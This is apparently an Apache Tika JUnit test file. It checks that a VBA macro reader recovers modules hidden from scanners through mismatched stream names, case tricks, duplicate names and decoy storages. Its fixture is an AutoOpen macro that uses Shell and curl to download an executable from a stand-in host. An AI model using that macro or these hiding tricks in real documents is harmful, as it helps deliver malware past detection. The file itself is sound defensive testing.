/*
 * Licensed to the Apache Software Foundation (ASF) under one or more
 * contributor license agreements.  See the NOTICE file distributed with
 * this work for additional information regarding copyright ownership.
 * The ASF licenses this file to You under the Apache License, Version 2.0
 * (the "License"); you may not use this file except in compliance with
 * the License.  You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.apache.tika.parser.microsoft;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertTrue;

import java.io.ByteArrayInputStream;
import java.util.Map;

import org.apache.poi.poifs.filesystem.POIFSFileSystem;
import org.apache.poi.poifs.macros.VBAMacroReader;
import org.junit.jupiter.api.Test;

/**
 * Ways a VBA project can name or place its modules such that a naive dir-stream reader looks
 * in the wrong place and reports "no macros" for a document that Excel/Word runs happily.
 *
 * <p>Each case is a TOTAL loss when it lands: the payload module's source never reaches the
 * consumer and nothing indicates anything was missed. Where POI's own reader handles the case,
 * it is used as the oracle -- the bar is "as much as POI finds", never less.
 */
public class LenientVBADirStreamTest {

    private static final String PAYLOAD = "Sub AutoOpen()\n"
            + "  Shell \"curl http://evil.example/a.exe -o a.exe\"\n"
            + "End Sub\n";
    private static final String DECOY = "Sub Harmless()\n  MsgBox \"hi\"\nEnd Sub\n";

    private static Map<String, String> lenient(byte[] poifs) throws Exception {
        try (POIFSFileSystem fs = new POIFSFileSystem(new ByteArrayInputStream(poifs))) {
            return LenientVBAReader.readMacros(fs, new LenientVBAReader.Bounds());
        }
    }

    private static Map<String, String> poi(byte[] poifs) throws Exception {
        try (POIFSFileSystem fs = new POIFSFileSystem(new ByteArrayInputStream(poifs));
             VBAMacroReader reader = new VBAMacroReader(fs)) {
            return reader.readMacros();
        }
    }

    private static void assertContainsSource(Map<String, String> macros, String needle,
                                             String what) {
        boolean found = macros.values().stream().anyMatch(v -> v.contains(needle));
        assertTrue(found, what + " -- macros found: " + macros.keySet()
                + ", bodies: " + macros.values());
    }

    /**
     * MODULENAME (0x0019) is a label; MODULESTREAMNAME (0x001A) says which OLE stream holds the
     * source. Reading the stream named by MODULENAME finds nothing when the two differ -- and
     * they differ whenever the author wants them to.
     */
    @Test
    void testModuleStreamNameLocatesTheStream() throws Exception {
        byte[] project = new VbaProjectBuilder()
                .module("ThisDocument", "m0", "m0", PAYLOAD)
                .build();

        assertContainsSource(poi(project), "evil.example",
                "oracle sanity: POI resolves the module by MODULESTREAMNAME");
        assertContainsSource(lenient(project), "evil.example",
                "the payload module must be found via MODULESTREAMNAME, not MODULENAME");
    }

    /**
     * OLE storage names are case-insensitive in Office, and olevba matches them that way. A
     * one-character case difference between the dir stream and the real entry must not hide a
     * module.
     */
    @Test
    void testStreamNameCaseMismatchStillResolves() throws Exception {
        byte[] project = new VbaProjectBuilder()
                .module("Module1", "module1", "MODULE1", PAYLOAD)
                .build();
        assertContainsSource(lenient(project), "evil.example",
                "a case-mismatched stream name must still resolve");
    }

    /**
     * Two modules sharing one MODULENAME: keying results by that name alone means the second
     * silently replaces the first. Same evidence-loss shape as the XLM duplicate-cell-ref
     * evasion -- the payload is the one that gets dropped.
     */
    @Test
    void testDuplicateModuleNamesBothSurvive() throws Exception {
        byte[] project = new VbaProjectBuilder()
                .module("Module1", "first", "first", DECOY)
                .module("Module1", "second", "second", PAYLOAD)
                .build();

        Map<String, String> ours = lenient(project);
        assertEquals(2, ours.size(),
                "both modules must be retained under distinct keys; got " + ours.keySet());
        assertContainsSource(ours, "evil.example",
                "the second module of a duplicated name must not be dropped");
        assertContainsSource(ours, "Harmless", "the first must not be dropped either");
    }

    /**
     * A project may contain more than one VBA storage. POI reads every one it finds; stopping at
     * the first means a decoy storage placed where the reader looks first hides the real one.
     */
    @Test
    void testEveryVbaStorageIsRead() throws Exception {
        // Root-level VBA holds the decoy; a nested one holds the payload.
        byte[] decoyProject = new VbaProjectBuilder().module("Decoy", DECOY).build();
        byte[] payloadProject = new VbaProjectBuilder()
                .nestedUnder("Macros").module("Payload", PAYLOAD).build();
        byte[] merged = mergePoifs(decoyProject, payloadProject);

        Map<String, String> byPoi = poi(merged);
        assertContainsSource(byPoi, "evil.example",
                "oracle sanity: POI reads both VBA storages");
        assertContainsSource(byPoi, "Harmless", "oracle sanity: POI reads the decoy too");

        Map<String, String> ours = lenient(merged);
        assertContainsSource(ours, "evil.example",
                "a payload in a second VBA storage must not be hidden by a decoy in the first");
    }

    /**
     * The same cases again, but through the DIRECTORY-TREE reader alone.
     *
     * <p>{@link LenientVBAReader#readMacros(POIFSFileSystem, LenientVBAReader.Bounds)} also runs
     * the orphan scan, which reaches raw properties by reflection into POI internals and
     * case-folds every stream name -- so it happens to paper over a tree walk that looks in the
     * wrong storage or matches case exactly. That fallback is explicitly documented to go dark on
     * any POI version drift ("recovery off"), which would take these cases with it. The tree
     * walk must handle them on its own.
     */
    @Test
    void testTreeWalkAloneReadsEveryStorageAndFoldsCase() throws Exception {
        byte[] decoyProject = new VbaProjectBuilder().module("Decoy", DECOY).build();
        byte[] payloadProject = new VbaProjectBuilder()
                .nestedUnder("Macros").module("Payload", PAYLOAD).build();
        byte[] merged = mergePoifs(decoyProject, payloadProject);
        try (POIFSFileSystem fs = new POIFSFileSystem(new ByteArrayInputStream(merged))) {
            Map<String, String> viaTree =
                    LenientVBAReader.readMacros(fs.getRoot(), new LenientVBAReader.Bounds());
            assertContainsSource(viaTree, "evil.example",
                    "the tree walk itself must read every VBA storage");
            assertContainsSource(viaTree, "Harmless",
                    "and must not lose the first storage while finding the second");
        }

        byte[] mixedCase = new VbaProjectBuilder()
                .module("Module1", "module1", "MODULE1", PAYLOAD)
                .build();
        try (POIFSFileSystem fs = new POIFSFileSystem(new ByteArrayInputStream(mixedCase))) {
            assertContainsSource(
                    LenientVBAReader.readMacros(fs.getRoot(), new LenientVBAReader.Bounds()),
                    "evil.example",
                    "the tree walk itself must resolve a case-mismatched stream name");
        }
    }

    /**
     * A second VBA project in a storage NOT named "VBA" is invisible to any tree walk that keys on
     * that name -- so only the raw property-table scan can reach it. That scan kept one entry per
     * stream name, which meant the tree-visible {@code dir} shadowed this one and the project it
     * describes was never read. The shadowed project is the one worth reading, that being the
     * reason to hide it.
     */
    @Test
    void testASecondDirStreamIsNotShadowedByTheFirst() throws Exception {
        byte[] visible = new VbaProjectBuilder().module("Decoy", DECOY).build();
        byte[] hidden = new VbaProjectBuilder().module("Payload", PAYLOAD).build();
        byte[] merged = copyVbaStorageAs(hidden, visible, "MBD00000000");

        Map<String, String> ours = lenient(merged);
        assertContainsSource(ours, "Harmless", "the tree-visible project must still be read");
        assertContainsSource(ours, "evil.example",
                "a project whose storage is not named VBA must still be recovered by the "
                        + "property-table scan -- its dir stream must not be shadowed");
    }

    /** Copy the VBA storage of {@code src} into {@code dst} under a DIFFERENT storage name. */
    private static byte[] copyVbaStorageAs(byte[] src, byte[] dst, String newName)
            throws Exception {
        try (POIFSFileSystem fsSrc = new POIFSFileSystem(new ByteArrayInputStream(src));
             POIFSFileSystem fsDst = new POIFSFileSystem(new ByteArrayInputStream(dst))) {
            org.apache.poi.poifs.filesystem.DirectoryEntry from =
                    (org.apache.poi.poifs.filesystem.DirectoryEntry) fsSrc.getRoot()
                            .getEntry("VBA");
            org.apache.poi.poifs.filesystem.DirectoryEntry to =
                    fsDst.getRoot().createDirectory(newName);
            for (org.apache.poi.poifs.filesystem.Entry e : from) {
                if (e instanceof org.apache.poi.poifs.filesystem.DocumentEntry) {
                    try (java.io.InputStream in = new org.apache.poi.poifs.filesystem
                            .DocumentInputStream(
                            (org.apache.poi.poifs.filesystem.DocumentEntry) e)) {
                        to.createDocument(e.getName(), in);
                    }
                }
            }
            java.io.ByteArrayOutputStream out = new java.io.ByteArrayOutputStream();
            fsDst.writeFilesystem(out);
            return out.toByteArray();
        }
    }

    /** Copy the root-level VBA storage of {@code a} into {@code b}'s filesystem. */
    private static byte[] mergePoifs(byte[] a, byte[] b) throws Exception {
        try (POIFSFileSystem fsA = new POIFSFileSystem(new ByteArrayInputStream(a));
             POIFSFileSystem fsB = new POIFSFileSystem(new ByteArrayInputStream(b))) {
            org.apache.poi.poifs.filesystem.DirectoryEntry src =
                    (org.apache.poi.poifs.filesystem.DirectoryEntry) fsA.getRoot()
                            .getEntry("VBA");
            org.apache.poi.poifs.filesystem.DirectoryEntry dst =
                    fsB.getRoot().createDirectory("VBA");
            for (org.apache.poi.poifs.filesystem.Entry e : src) {
                if (e instanceof org.apache.poi.poifs.filesystem.DocumentEntry) {
                    try (java.io.InputStream in = new org.apache.poi.poifs.filesystem
                            .DocumentInputStream(
                            (org.apache.poi.poifs.filesystem.DocumentEntry) e)) {
                        dst.createDocument(e.getName(), in);
                    }
                }
            }
            java.io.ByteArrayOutputStream out = new java.io.ByteArrayOutputStream();
            fsB.writeFilesystem(out);
            return out.toByteArray();
        }
    }
}
